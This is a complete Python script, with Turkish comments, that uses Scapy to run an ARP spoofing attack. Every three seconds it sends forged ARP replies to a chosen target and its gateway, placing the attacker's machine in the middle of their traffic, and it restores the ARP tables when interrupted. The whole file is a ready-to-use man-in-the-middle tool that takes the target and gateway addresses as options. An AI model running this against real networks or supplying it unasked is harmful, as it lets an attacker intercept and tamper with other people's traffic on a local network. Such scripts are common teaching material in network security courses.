import scapy.all as scapy
import time
import optparse
def get_mac_address(ip):
    #scapy.ls(scapy.ARP())
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#verbose=False komutu yazdirilanlari gizlememizi saglar. yoksa while devamli yazi yazar
def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)
    #scapy.ls(scapy.ARP()) komutu yardim komutu gibidir.

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    getway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac,psrc=gateway_ip, hwsrc=getway_mac)
    scapy.send(arp_response, verbose=False)
    #scapy.ls(scapy.ARP()) komutu yardim komutu gibidir.

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")
    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

print("Sending package every 3 second")
print("Please press Ctrl + C to end the process!")
try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        #time.sleep ile donguye girmeden once 3 saniye bekler.
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit and Reset operation")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)